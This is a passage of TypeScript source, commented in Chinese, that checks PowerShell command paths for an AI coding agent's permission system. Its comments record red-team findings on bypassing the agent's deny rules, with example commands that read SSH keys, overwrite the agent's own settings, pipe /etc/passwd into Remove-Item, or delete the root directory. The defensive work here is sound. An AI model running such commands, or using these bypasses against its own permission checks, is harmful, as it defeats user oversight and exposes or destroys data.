    const backtickStripped = normalizedPath.replace(/`/g, '')
    const denyHit = checkDenyRuleForGuessedPath(
      backtickStripped,
      cwd,
      toolPermissionContext,
      operationType,
    )
    if (denyHit) {
      return {
        allowed: false,
        resolvedPath: denyHit.resolvedPath,
        decisionReason: { type: 'rule', rule: denyHit.rule },
      }
    }
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason:
          '路径中的反引号转义字符无法静态校验，需要人工审批',
      },
    }
  }

  // 安全：阻止模块限定的 provider 路径。PowerShell 允许
  // `Microsoft.PowerShell.Core\FileSystem::/etc/passwd`，它通过 FileSystem
  // provider 解析为 `/etc/passwd`。`::` 是 provider 路径分隔符，
  // 与简单的 `^[a-z]{2,}:` 正则不匹配。
  if (normalizedPath.includes('::')) {
    // 剥离到第一个 :: 为止的全部内容——同时处理 FileSystem::/path 和
    // Microsoft.PowerShell.Core\FileSystem::/path 两种形式。
    // 双 ::（Foo::Bar::/x）只剥离第一个 → 'Bar::/x' → resolve
    // 使其变为 {cwd}/Bar::/x → 不会匹配真实 deny 规则 → 回退到 ask。
    // 安全。
    const afterProvider = normalizedPath.slice(normalizedPath.indexOf('::') + 2)
    const denyHit = checkDenyRuleForGuessedPath(
      afterProvider,
      cwd,
      toolPermissionContext,
      operationType,
    )
    if (denyHit) {
      return {
        allowed: false,
        resolvedPath: denyHit.resolvedPath,
        decisionReason: { type: 'rule', rule: denyHit.rule },
      }
    }
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason:
          '模块限定的 provider 路径（::）无法静态校验，需要人工审批',
      },
    }
  }

  // 安全：阻止 UNC 路径——它们会触发网络请求并可能泄露 NTLM/Kerberos 凭据
  if (
    normalizedPath.startsWith('//') ||
    /DavWWWRoot/i.test(normalizedPath) ||
    /@SSL@/i.test(normalizedPath)
  ) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason:
          'UNC 路径已被阻止，因为它们可能触发网络请求和凭据泄露',
      },
    }
  }

  // 安全：拒绝包含 shell 展开语法的路径
  if (normalizedPath.includes('$') || normalizedPath.includes('%')) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: '路径中的变量展开语法需要人工审批',
      },
    }
  }

  // 安全：阻止非文件系统 provider 路径（env:、HKLM:、alias:、function: 等）
  // 这些路径访问非文件系统资源，必须要求人工审批。
  // 这会捕获冒号语法，如 -Path:env:HOME，其中提取出的值是 'env:HOME'。
  //
  // 平台拆分（发现 #21/#28）：
  // - Windows：要求 ':' 前至少 2 个字母，这样原生盘符（C:、D:）
  //   能交给 path.win32.isAbsolute/resolve 正确处理。
  // - POSIX：【任何】<字母>: 前缀都是 PowerShell PSDrive——单字母盘符
  //   在 Linux/macOS 上没有任何原生含义。`New-PSDrive -Name Z -Root /etc`
  //   然后 `Get-Content Z:/secrets` 否则会通过
  //   path.posix.resolve(cwd, 'Z:/secrets') → '{cwd}/Z:/secrets' → 位于 cwd 内 →
  //   放行，从而绕过 Read(/etc/**) deny 规则。我们无法静态知道一个 PSDrive
  //   映射到哪个文件系统根，因此在 POSIX 上把所有带盘符前缀的路径都视为
  //   无法校验。
  // 在 PSDrive 名称中包含数字（缺陷 #23）：`New-PSDrive -Name 1 ...`
  // 会创建 `1:` 这个盘——一个有效的 PSDrive 路径前缀。
  // Windows 正则要求 2+ 个字符，以排除单字母的原生盘符（C:、D:）。
  // 使用单一字符类 [a-z0-9] 来捕获混合字母数字的 PSDrive 名称，如
  // `a1:`、`1a:`——之前的 `[a-z]{2,}|[0-9]+` 分类会漏掉这些，因为
  // `a1` 既非纯字母也非纯数字。
  const providerPathRegex =
    getPlatform() === 'windows' ? /^[a-z0-9]{2,}:/i : /^[a-z0-9]+:/i
  if (providerPathRegex.test(normalizedPath)) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: `路径 '${normalizedPath}' 使用了非文件系统 provider，需要人工审批`,
      },
    }
  }

  // 安全：阻止写/创建操作中的 glob 模式
  if (GLOB_PATTERN_REGEX.test(normalizedPath)) {
    if (operationType === 'write' || operationType === 'create') {
      return {
        allowed: false,
        resolvedPath: normalizedPath,
        decisionReason: {
          type: 'other',
          reason:
            '写操作中不允许使用 glob 模式。请指定确切的文件路径。',
        },
      }
    }

    // 对于带路径穿越的读取操作（例如 /project/*/../../../etc/shadow），
    // 解析完整路径（含 glob 字符）并校验该解析结果。
    // 这会捕获在 glob 之后通过 `..` 逃逸工作目录的模式。
    if (containsPathTraversal(normalizedPath)) {
      const absolutePath = isAbsolute(normalizedPath)
        ? normalizedPath
        : resolve(cwd, normalizedPath)
      const { resolvedPath, isCanonical } = safeResolvePath(
        getFsImplementation(),
        absolutePath,
      )
      const result = isPathAllowed(
        resolvedPath,
        toolPermissionContext,
        operationType,
        isCanonical ? [resolvedPath] : undefined,
      )
      return {
        allowed: result.allowed,
        resolvedPath,
        decisionReason: result.decisionReason,
      }
    }

    // 安全（发现 #15）：读取操作的 glob 模式无法静态校验。
    // getGlobBaseDirectory 返回第一个 glob 字符之前的目录；只有该基准
    // 会被 realpath。glob 匹配到的任何内容（含符号链接）都不会被检查。
    // 例如：
    //   /project/*/passwd，其中符号链接 /project/link → /etc
    // 基准目录是 /project（允许），但运行时会把 * 展开为 'link' 并读取
    // /etc/passwd。如果不实际展开 glob（需要文件系统访问，且仍会与
    // 攻击者在校验后创建符号链接形成竞态），我们无法校验 glob 展开内的
    // 符号链接。
    //
    // 仍然在基准目录上检查 deny 规则，使显式的 Read(/project/**) deny
    // 规则得以触发。如果没有 deny 匹配，则强制 ask。
    const basePath = getGlobBaseDirectory(normalizedPath)
    const absoluteBasePath = isAbsolute(basePath)
      ? basePath
      : resolve(cwd, basePath)
    const { resolvedPath } = safeResolvePath(
      getFsImplementation(),
      absoluteBasePath,
    )
    const permissionType = operationType === 'read' ? 'read' : 'edit'
    const denyRule = matchingRuleForInput(
      resolvedPath,
      toolPermissionContext,
      permissionType,
      'deny',
    )
    if (denyRule !== null) {
      return {
        allowed: false,
        resolvedPath,
        decisionReason: { type: 'rule', rule: denyRule },
      }
    }
    return {
      allowed: false,
      resolvedPath,
      decisionReason: {
        type: 'other',
        reason:
          '路径中的 glob 模式无法静态校验——glob 展开内的符号链接不会被检查。需要人工审批。',
      },
    }
  }

  // 解析路径
  const absolutePath = isAbsolute(normalizedPath)
    ? normalizedPath
    : resolve(cwd, normalizedPath)
  const { resolvedPath, isCanonical } = safeResolvePath(
    getFsImplementation(),
    absolutePath,
  )

  const result = isPathAllowed(
    resolvedPath,
    toolPermissionContext,
    operationType,
    isCanonical ? [resolvedPath] : undefined,
  )
  return {
    allowed: result.allowed,
    resolvedPath,
    decisionReason: result.decisionReason,
  }
}

function getGlobBaseDirectory(filePath: string): string {
  const globMatch = filePath.match(GLOB_PATTERN_REGEX)
  if (!globMatch || globMatch.index === undefined) {
    return filePath
  }
  const beforeGlob = filePath.substring(0, globMatch.index)
  const lastSepIndex = Math.max(
    beforeGlob.lastIndexOf('/'),
    beforeGlob.lastIndexOf('\\'),
  )
  if (lastSepIndex === -1) return '.'
  return beforeGlob.substring(0, lastSepIndex + 1) || '/'
}

/**
 * 可安全提取为字面路径字符串的元素类型。
 *
 * 只有值可静态得知的元素类型才适合做路径提取。Variable 和
 * ExpandableString 的值是在运行时决定的——即使它们在下游有防御
 *（validatePath 的 `includes('$')` 检查中的 $ 检测，以及
 * hasExpandableStrings 安全标志），在这里排除它们仍属于直接防御：
 * 在最早的门槛上就失败安全，而不是依赖下游检查来捕获。
 *
 * 任何其他类型（例如数组字面量的 'Other'、'SubExpression'、
 * 'ScriptBlock'、'Variable'、'ExpandableString'）都无法静态校验，
 * 必须强制 ask。
 */
const SAFE_PATH_ELEMENT_TYPES = new Set<string>(['StringConstant', 'Parameter'])

/**
 * 从解析后的 PowerShell 命令元素中提取文件路径。
 * 使用 AST 参数查找位置参数和命名路径参数。
 *
 * 如果任何路径参数的 elementType 较复杂（例如数组字面量、
 * 子表达式），无法静态校验，则设置 hasUnvalidatablePathArg，让调用方
 * 能够强制 ask。
 */
function extractPathsFromCommand(cmd: ParsedCommandElement): {
  paths: string[]
  operationType: FileOperationType
  hasUnvalidatablePathArg: boolean
  optionalWrite: boolean
} {
  const canonical = resolveToCanonical(cmd.name)
  const config = CMDLET_PATH_CONFIG[canonical]

  if (!config) {
    return {
      paths: [],
      operationType: 'read',
      hasUnvalidatablePathArg: false,
      optionalWrite: false,
    }
  }

  // 构建每个 cmdlet 的已知参数集合，合并公共参数。
  const switchParams = [...config.knownSwitches, ...COMMON_SWITCHES]
  const valueParams = [...config.knownValueParams, ...COMMON_VALUE_PARAMS]

  const paths: string[] = []
  const args = cmd.args
  // elementTypes[0] 是命令名；elementTypes[i+1] 对应 args[i]
  const elementTypes = cmd.elementTypes
  let hasUnvalidatablePathArg = false
  let positionalsSeen = 0
  const positionalSkip = config.positionalSkip ?? 0

  function checkArgElementType(argIdx: number): void {
    if (!elementTypes) return
    const et = elementTypes[argIdx + 1]
    if (et && !SAFE_PATH_ELEMENT_TYPES.has(et)) {
      hasUnvalidatablePathArg = true
    }
  }

  // 提取命名参数值（例如 -Path "C:\foo"）
  for (let i = 0; i < args.length; i++) {
    const arg = args[i]
    if (!arg) continue

    // 检查该参数是否为参数名。
    // 安全：把 elementTypes 当作基准事实。PowerShell 的词法分析器
    // 接受 en-dash/em-dash/horizontal-bar（U+2013/2014/2015）作为参数
    // 前缀；裸露的 startsWith('-') 检查会漏掉 `–Path`（en-dash）。
    // 无论破折号字符如何，解析器都会把 CommandParameterAst 映射为
    // 'Parameter'。isPowerShellParameter 也能正确拒绝带引号的
    // "-Include"（是 StringConstant，不是参数）。
    const argElementType = elementTypes ? elementTypes[i + 1] : undefined
    if (isPowerShellParameter(arg, argElementType)) {
      // 处理冒号语法：-Path:C:\secret
      // 将 Unicode 破折号归一化为 ASCII `-`（pathParams 都以 `-` 存储）。
      const normalized = '-' + arg.slice(1)
      const colonIdx = normalized.indexOf(':', 1) // 跳过第一个字符（破折号）
      const paramName =
        colonIdx > 0 ? normalized.substring(0, colonIdx) : normalized
      const paramLower = paramName.toLowerCase()

      if (matchesParam(paramLower, config.pathParams)) {
        // 已知路径参数——将它的值提取为路径。
        let value: string | undefined
        if (colonIdx > 0) {
          // 冒号语法：-Path:value —— 整个结构是一个元素。
          // 安全：逗号分隔的值（例如 -Path:safe.txt,/etc/passwd）会在
          // CommandParameterAst 内部产生 ArrayLiteralExpressionAst。
          // PowerShell 会写入【所有】路径，但我们只看到单个字符串。
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          } else {
            value = rawValue
          }
        } else {
          // 标准语法：-Path value
          const nextVal = args[i + 1]
          const nextType = elementTypes ? elementTypes[i + 2] : undefined
          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
            value = nextVal
            checkArgElementType(i + 1)
            i++ // 跳过该值
          }
        }
        if (value) {
          paths.push(value)
        }
      } else if (
        config.leafOnlyPathParams &&
        matchesParam(paramLower, config.leafOnlyPathParams)
      ) {
        // 叶子限定的路径参数（例如 New-Item -Name）。PowerShell 相对
        //【另一个】参数（-Path）而非 cwd 解析它。validatePath 相对 cwd
        // 解析（L930），因此非叶子值（分隔符、穿越）会解析到【错误】的位置，
        // 并可能漏掉 deny 规则（deny→ask 降级）。提取简单叶子文件名；
        // 任何类似路径的内容都会被标记。
        let value: string | undefined
        if (colonIdx > 0) {
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          } else {
            value = rawValue
          }
        } else {
          const nextVal = args[i + 1]
          const nextType = elementTypes ? elementTypes[i + 2] : undefined
          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
            value = nextVal
            checkArgElementType(i + 1)
            i++
          }
        }
        if (value !== undefined) {
          if (
            value.includes('/') ||
            value.includes('\\') ||
            value === '.' ||
            value === '..'
          ) {
            // 非叶子：含分隔符或穿越。在不与 -Path 拼接的前提下无法正确
            // 解析。强制 ask。
            hasUnvalidatablePathArg = true
          } else {
            // 简单叶子：提取。解析为 cwd/leaf（略有偏差——应当是
            // <-Path>/leaf），但 -Path 提取已覆盖目录，且叶子文件名
            // 无法从任何位置穿越出去。
            paths.push(value)
          }
        }
      } else if (matchesParam(paramLower, switchParams)) {
        // 已知开关参数——不取值，不要消费下一个参数。
        //（开关上的冒号语法，如 -Confirm:$false，自包含在单个 token 中，
        // 会在此处正确通过而不消费值。）
      } else if (matchesParam(paramLower, valueParams)) {
        // 已知的取值非路径参数（例如 -Encoding UTF8、-Filter *.txt）。
        // 消费其值；不要当作路径校验，但要检查 elementType。
        // 安全：任何参数位置出现 Variable elementType（例如
        // $env:LIMKENION_API_KEY）都意味着运行时值无法静态得知。
        // 没有此检查，`-Value $env:SECRET` 会在 acceptEdits 模式下被静默
        // 自动放行，因为 Variable elementType 从未被检查。
        if (colonIdx > 0) {
          // 冒号语法：-Value:$env:FOO —— 值内嵌在 token 中。
          // 外层 CommandParameterAst 的 'Parameter' 类型会掩盖内层
          // 表达式的类型。检查是否存在指示非静态值的表达式标记
          //（与 pathParams 的冒号语法守卫一致）。
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          }
        } else {
          const nextArg = args[i + 1]
          const nextArgType = elementTypes ? elementTypes[i + 2] : undefined
          if (nextArg && !isPowerShellParameter(nextArg, nextArgType)) {
            checkArgElementType(i + 1)
            i++ // 跳过该参数的值
          }
        }
      } else {
        // 未知参数——我们无法理解这次调用。
        // 安全:这是对 KNOWN_SWITCH_PARAMS "打地鼠"问题的结构性修复。
        // 与其猜测该参数是开关（并冒着吞掉位置路径的风险）还是取值
        //（同样有风险），不如把整条命令标记为无法校验。
        // 调用方将强制 ask。
        hasUnvalidatablePathArg = true
        // 安全：即使我们不识别该参数，如果它使用了冒号语法
        // （-UnknownParam:/etc/hosts），其绑定的值可能是文件系统路径。
        // 仍把它提取进 paths[]，让 deny 规则匹配得以运行。否则该值会被
        // 困在单个 token 内，paths=[] 意味着 deny 规则永不参与——
        // 把 deny 降级为 ask。这是纵深防御：主要修复是把所有已知别名
        // 都加到上面的 pathParams 中。
        if (colonIdx > 0) {
          const rawValue = arg.substring(colonIdx + 1)
          if (!hasComplexColonValue(rawValue)) {
            paths.push(rawValue)
          }
        }
        // 继续循环，这样我们仍能提取任何可识别的路径
        //（对 ask 消息有用），但该标志保证整体是 ask。
      }
      continue
    }

    // 位置参数：作为路径提取（例如 Get-Content file.txt）
    // 第一个位置参数通常是源路径。
    // 跳过作为非路径值的前导位置参数（例如 iwr 的 -Uri）。
    if (positionalsSeen < positionalSkip) {
      positionalsSeen++
      continue
    }
    positionalsSeen++
    checkArgElementType(i)
    paths.push(arg)
  }

  return {
    paths,
    operationType: config.operationType,
    hasUnvalidatablePathArg,
    optionalWrite: config.optionalWrite ?? false,
  }
}

/**
 * 检查 PowerShell 命令的路径约束。
 * 从解析后的 AST 中提取文件路径，并校验它们都在允许的目录内。
 *
 * @param compoundCommandHasCd - 整个复合命令是否包含改变 cwd 的 cmdlet
 * （Set-Location/Push-Location/Pop-Location/New-PSDrive，排除 Set-Location
 * 到当前目录这种空操作）。为 true 时，任何语句中的相对路径都不可信——
 * PowerShell 按顺序执行语句，语句 N 中的 cd 会改变语句 N+1 的 cwd，但
 * 本校验器是用过期的 Node 进程 cwd 解析所有路径的。
 * 与 BashTool 对齐（BashTool/pathValidation.ts:630-655）。
 *
 * @returns
 * - 若任何路径命令尝试访问允许目录之外，返回 'ask'
 * - 若 deny 规则显式阻止了路径，返回 'deny'
 * - 若未发现路径命令或所有路径都有效，返回 'passthrough'
 */
export function checkPathConstraints(
  input: { command: string },
  parsed: ParsedPowerShellCommand,
  toolPermissionContext: ToolPermissionContext,
  compoundCommandHasCd = false,
): PermissionResult {
  if (!parsed.valid) {
    return {
      behavior: 'passthrough',
      message: '无法对未解析的命令校验路径',
    }
  }

  // 安全：两遍处理——检查【所有】语句/路径，使 deny 规则始终优先于 ask。
  // 否则，语句 1 上的 ask 可能在检查语句 2 的 deny 规则之前就返回，
  // 从而让用户批准一条包含被拒绝路径的命令。
  let firstAsk: PermissionResult | undefined

  for (const statement of parsed.statements) {
    const result = checkPathConstraintsForStatement(
      statement,
      toolPermissionContext,
      compoundCommandHasCd,
    )
    if (result.behavior === 'deny') {
      return result
    }
    if (result.behavior === 'ask' && !firstAsk) {
      firstAsk = result
    }
  }

  return (
    firstAsk ?? {
      behavior: 'passthrough',
      message: '所有路径约束均已成功校验',
    }
  )
}

function checkPathConstraintsForStatement(
  statement: ParsedPowerShellCommand['statements'][number],
  toolPermissionContext: ToolPermissionContext,
  compoundCommandHasCd = false,
): PermissionResult {
  const cwd = getCwd()
  let firstAsk: PermissionResult | undefined

  // 安全：与 BashTool 对齐——阻止包含改变 cwd 的 cmdlet 的复合命令中的
  // 路径操作（BashTool/pathValidation.ts:630-655）。
  //
  // 当复合命令包含 Set-Location/Push-Location/Pop-Location/New-PSDrive 时，
  // 后续语句中的相对路径在运行时相对【已改变】的 cwd 解析，但本校验器是
  // 用【过期的】getCwd() 快照解析的。攻击示例（发现 #3）：
  //   Set-Location ./.limkenion; Set-Content ./settings.json '...'
  // 校验器看到 ./settings.json → /project/settings.json（不是配置文件）。
  // 运行时写入 /project/.limkenion/settings.json（Limkenion 的权限配置）。
  //
  //【已否决】的替代方案：沿语句链模拟 cwd——在 `Set-Location ./.limkenion`
  // 之后，用 cwd='./.limkenion' 校验后续语句。这会更加宽松，但需要仔细处理：
  //   - Push-Location/Pop-Location 的栈语义
  //   - 无参数的 Set-Location（某些平台 → home）
  //   - New-PSDrive 根映射（任意文件系统根）
  //   - 条件/循环语句中 cd 可能执行也可能不执行
  //   - cd 目标无法静态确定时的错误情况
  // 目前我们采用要求人工审批的保守做法。
  //
  // 与 BashTool 以 `operationType !== 'read'` 为门槛不同，我们也阻止【读取】
  //（发现 #27）：`Set-Location ~; Get-Content ./.ssh/id_rsa` 能绕过
  // Read(~/.ssh/**) deny 规则，因为校验器是把 deny 与 /project/.ssh/id_rsa
  // 匹配的。从错误解析路径进行的读取就像写入会摧毁数据一样会泄露数据。
  // 我们在下面仍然运行 deny 规则匹配（通过 firstAsk，而非提前返回），
  // 因此过期解析路径上的显式 deny 规则仍会被遵守——在调用方的归约中
  // deny > ask。
  if (compoundCommandHasCd) {
    firstAsk = {
      behavior: 'ask',
      message:
        '复合命令会改变工作目录（Set-Location/Push-Location/Pop-Location/New-PSDrive）——相对路径无法相对原始 cwd 校验，需要人工审批',
      decisionReason: {
        type: 'other',
        reason:
          '复合命令包含带路径操作的 cd——需要人工审批以防止路径解析绕过',
      },
    }
  }

  // 安全：跟踪此语句是否包含非 CommandAst 的管道元素（字符串字面量、
  // 变量、数组表达式）。PowerShell 会将这些值管道给下游 cmdlet，常绑定到
  // -Path。示例：`'/etc/passwd' | Remove-Item` —— 字符串被管道给
  // Remove-Item 的 -Path，但 Remove-Item 没有显式参数，因此
  // extractPathsFromCommand 返回零个路径，命令会 passthrough。
  // 如果【任何】下游 cmdlet 与表达式源并存，我们强制 ask——无论操作类型
  // 如何，被管道的路径都无法校验（读取泄露数据；写入摧毁它）。
  let hasExpressionPipelineSource = false
  // 跟踪非 CommandAst 元素的文本，用于 deny 规则猜测（发现 #23）。
  // `'.git/hooks/pre-commit' | Remove-Item` —— 路径经管道传入，paths=[]
  //（来自 extractPathsFromCommand），因此下面的 deny 循环永远不会迭代。
  // 我们把管道源文本交给 checkDenyRuleForGuessedPath，使显式的
  // Edit(.git/**) deny 规则仍能触发。
  let pipelineSourceText: string | undefined

  for (const cmd of statement.commands) {
    if (cmd.elementType !== 'CommandAst') {
      hasExpressionPipelineSource = true
      pipelineSourceText = cmd.text
      continue
    }

    const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
      extractPathsFromCommand(cmd)

    // 安全：接收来自表达式源管道路径的 cmdlet。
    // `'/etc/shadow' | Get-Content` —— Get-Content 提取零个路径
    //（没有显式参数）。路径来自管道，无法静态校验。以前会对读取豁免
    //（`operationType !== 'read'`），但那是绕过（审查评论 2885739292）：
    // 从无法校验的路径进行读取同样是安全风险。无论操作类型如何都 ask。
    if (hasExpressionPipelineSource) {
      const canonical = resolveToCanonical(cmd.name)
      // 安全（发现 #23）：在回退到 ask 之前，检查管道源文本是否匹配 deny
      // 规则。配置了 Edit(.git/**) 时，`'.git/hooks/pre-commit' | Remove-Item`
      // 应当 DENY（而非 ask）。剥离首尾引号（字符串字面量在 .text 中是
      // 带引号的），并送入与 ::/反引号路径相同的 deny 猜测辅助函数。
      if (pipelineSourceText !== undefined) {
        const stripped = pipelineSourceText.replace(/^['"]|['"]$/g, '')
        const denyHit = checkDenyRuleForGuessedPath(
          stripped,
          cwd,
          toolPermissionContext,
          operationType,
        )
        if (denyHit) {
          return {
            behavior: 'deny',
            message: `针对 '${denyHit.resolvedPath}' 的 ${canonical} 已被 deny 规则阻止`,
            decisionReason: { type: 'rule', rule: denyHit.rule },
          }
        }
      }
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} 从无法静态校验的管道表达式源获取路径，需要人工审批`,
      }
      // 不要 continue——继续进入路径循环，这样提取出路径上的 deny 规则
      // 仍会被检查。
    }

    // 安全：数组字面量、子表达式和其他复杂参数类型无法静态校验。
    // 像 `-Path ./safe.txt, /etc/passwd` 这样的数组字面量会产生单个
    // 'Other' 元素，其合并文本可能解析在 CWD 内，而 PowerShell 实际会
    // 写入数组中的【所有】路径。
    if (hasUnvalidatablePathArg) {
      const canonical = resolveToCanonical(cmd.name)
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} 使用了无法静态校验的参数或复杂路径表达式（数组字面量、子表达式、未知参数等），需要人工审批`,
      }
      // 不要 continue——继续进入路径循环，这样提取出路径上的 deny 规则
      // 仍会被检查。
    }

    // 安全：CMDLET_PATH_CONFIG 中属于写 cmdlet 却提取出零路径的情况。
    // 要么（a）cmdlet 完全没有参数（单独一个 `Remove-Item`——
    // PowerShell 会报错，但我们不应乐观地假设如此），要么
    //（b）我们未能从参数中识别出路径（有了未知参数兜底不应发生，
    // 但属于纵深防御）。保守做法：没有经过校验目标的写操作 → ask。
    // 读 cmdlet 和 pop-location（pathParams: []）豁免。
    // optionalWrite cmdlet（不带 -OutFile 的 Invoke-WebRequest/Invoke-RestMethod）
    //【同样】豁免——它们只有在存在 pathParam 时才写入磁盘；没有则输出
    // 进入管道。上面的 hasUnvalidatablePathArg 检查已覆盖未知参数情况。
    if (
      operationType !== 'read' &&
      !optionalWrite &&
      paths.length === 0 &&
      CMDLET_PATH_CONFIG[resolveToCanonical(cmd.name)]
    ) {
      const canonical = resolveToCanonical(cmd.name)
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} 是写操作，但无法确定目标路径；需要人工审批`,
      }
      continue
    }

    // 安全：对系统关键路径上的删除 cmdlet 运用 bash 对齐的硬 deny。
    // BashTool 有 isDangerousRemovalPath，它会无视用户配置对 `rm /`、
    // `rm ~`、`rm /etc` 等施以硬 DENY。移植：对危险路径上的 remove-item
    //（以及 rm/del/ri/rd/rmdir/erase 等别名 → resolveToCanonical）→ deny
    //（而非 ask）。用户不能批准删除 system32。
    const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'

    for (const filePath of paths) {
      // 对危险系统路径（/、~、/etc 等）施以硬 deny 的删除。
      // 先检查【原始】路径（realpath 之前）：safeResolvePath 可能把
      // '/' 规范化成 'C:\'（Windows）或把 '/var/...' 规范化成
      // '/private/var/...'（macOS），这会绕过 isDangerousRemovalPath 的
      // 字符串比较。
      if (isRemoval && isDangerousRemovalRawPath(filePath)) {
        return dangerousRemovalDeny(filePath)
      }

      const { allowed, resolvedPath, decisionReason } = validatePath(
        filePath,
        cwd,
        toolPermissionContext,
        operationType,
      )

      // 也检查解析后的路径——捕获解析到受保护位置的符号链接。
      if (isRemoval && isDangerousRemovalPath(resolvedPath)) {
        return dangerousRemovalDeny(resolvedPath)
      }

      if (!allowed) {
        const canonical = resolveToCanonical(cmd.name)
        const workingDirs = Array.from(
          allWorkingDirectories(toolPermissionContext),
        )
        const dirListStr = formatDirectoryList(workingDirs)

        const message =
          decisionReason?.type === 'other' ||
          decisionReason?.type === 'safetyCheck'
            ? decisionReason.reason
            : `针对 '${resolvedPath}' 的 ${canonical} 已被阻止。出于安全考虑，Limkenion 只能访问本会话允许的工作目录中的文件：${dirListStr}。`

        if (decisionReason?.type === 'rule') {
          return {
            behavior: 'deny',
            message,
            decisionReason,
          }
        }

        const suggestions: PermissionUpdate[] = []
        if (resolvedPath) {
          if (operationType === 'read') {
            const suggestion = createReadRuleSuggestion(
              getDirectoryForPath(resolvedPath),
              'session',
            )
            if (suggestion) {
              suggestions.push(suggestion)
            }
          } else {
            suggestions.push({
              type: 'addDirectories',
              directories: [getDirectoryForPath(resolvedPath)],
              destination: 'session',
            })
          }
        }

        if (operationType === 'write' || operationType === 'create') {
          suggestions.push({
            type: 'setMode',
            mode: 'acceptEdits',
            destination: 'session',
          })
        }

        firstAsk ??= {
          behavior: 'ask',
          message,
          blockedPath: resolvedPath,
          decisionReason,
          suggestions,
        }
      }
    }
  }

  // 也要检查控制流中的嵌套命令
  if (statement.nestedCommands) {
    for (const cmd of statement.nestedCommands) {
      const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
        extractPathsFromCommand(cmd)

      if (hasUnvalidatablePathArg) {
        const canonical = resolveToCanonical(cmd.name)
        firstAsk ??= {
          behavior: 'ask',
          message: `${canonical} 使用了无法静态校验的参数或复杂路径表达式（数组字面量、子表达式、未知参数等），需要人工审批`,
        }
        // 不要 continue——继续进入路径循环做 deny 检查。
      }

      // 安全：提取出零路径的写 cmdlet（与主循环一致）。
      // optionalWrite cmdlet 豁免——参见主循环注释。
      if (
        operationType !== 'read' &&
        !optionalWrite &&
        paths.length === 0 &&
        CMDLET_PATH_CONFIG[resolveToCanonical(cmd.name)]
      ) {
        const canonical = resolveToCanonical(cmd.name)
        firstAsk ??= {
          behavior: 'ask',
          message: `${canonical} 是写操作，但无法确定目标路径；需要人工审批`,
        }
        continue
      }

      // 安全：对系统关键路径上的删除运用 bash 对齐的硬 deny——
      // 与上面主循环的检查一致。没有它，`if ($true) { Remove-Item / }`
      // 会经由 nestedCommands 路径执行，并把 deny→ask 降级，让用户
      // 批准根目录删除。
      const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'

      for (const filePath of paths) {
        // 先检查【原始】路径（realpath 之前）；参见主循环注释。
        if (isRemoval && isDangerousRemovalRawPath(filePath)) {
          return dangerousRemovalDeny(filePath)
        }

        const { allowed, resolvedPath, decisionReason } = validatePath(
          filePath,
          cwd,
          toolPermissionContext,
          operationType,
        )

        if (isRemoval && isDangerousRemovalPath(resolvedPath)) {
          return dangerousRemovalDeny(resolvedPath)
        }

        if (!allowed) {
          const canonical = resolveToCanonical(cmd.name)
          const workingDirs = Array.from(
            allWorkingDirectories(toolPermissionContext),
          )
          const dirListStr = formatDirectoryList(workingDirs)

          const message =
            decisionReason?.type === 'other' ||
            decisionReason?.type === 'safetyCheck'
              ? decisionReason.reason
              : `针对 '${resolvedPath}' 的 ${canonical} 已被阻止。出于安全考虑，Limkenion 只能访问本会话允许的工作目录中的文件：${dirListStr}。`

          if (decisionReason?.type === 'rule') {
            return {
              behavior: 'deny',
              message,
              decisionReason,
            }
          }

          const suggestions: PermissionUpdate[] = []
          if (resolvedPath) {
            if (operationType === 'read') {
              const suggestion = createReadRuleSuggestion(
                getDirectoryForPath(resolvedPath),
                'session',
              )
              if (suggestion) {
                suggestions.push(suggestion)
              }
            } else {
              suggestions.push({
                type: 'addDirectories',
                directories: [getDirectoryForPath(resolvedPath)],
                destination: 'session',
              })
            }
          }

          if (operationType === 'write' || operationType === 'create') {
            suggestions.push({
              type: 'setMode',
              mode: 'acceptEdits',
              destination: 'session',
            })
          }

          firstAsk ??= {
            behavior: 'ask',
            message,
            blockedPath: resolvedPath,
            decisionReason,
            suggestions,
          }
        }
      }

      // 红队 P11/P14：powershellPermissions.ts:970 的第 5 步已经通过同样的
      // synthetic-CommandExpressionAst 机制捕获此情况——这里是双保险，
      // 使嵌套循环不依赖那个偶然。放在路径循环【之后】，让更具体的 ask
      //（blockedPath、suggestions）通过 ??= 胜出。
      if (hasExpressionPipelineSource) {
        firstAsk ??= {
          behavior: 'ask',
          message: `${resolveToCanonical(cmd.name)} 出现在控制流或链式语句中，其中被管道的表达式源无法静态校验，需要人工审批`,
        }
      }
    }
  }

  // 检查嵌套命令上的重定向（例如来自 && / || 链）
  if (statement.nestedCommands) {
    for (const cmd of statement.nestedCommands) {
      if (cmd.redirections) {
        for (const redir of cmd.redirections) {
          if (redir.isMerging) continue
          if (!redir.target) continue
          if (isNullRedirectionTarget(redir.target)) continue

          const { allowed, resolvedPath, decisionReason } = validatePath(
            redir.target,
            cwd,
            toolPermissionContext,
            'create',
          )

          if (!allowed) {
            const workingDirs = Array.from(
              allWorkingDirectories(toolPermissionContext),
            )
            const dirListStr = formatDirectoryList(workingDirs)

            const message =
              decisionReason?.type === 'other' ||
              decisionReason?.type === 'safetyCheck'
                ? decisionReason.reason
                : `输出重定向到 '${resolvedPath}' 已被阻止。出于安全考虑，Limkenion 只能写入本会话允许的工作目录中的文件：${dirListStr}。`

            if (decisionReason?.type === 'rule') {
              return {
                behavior: 'deny',
                message,
                decisionReason,
              }
            }

            firstAsk ??= {
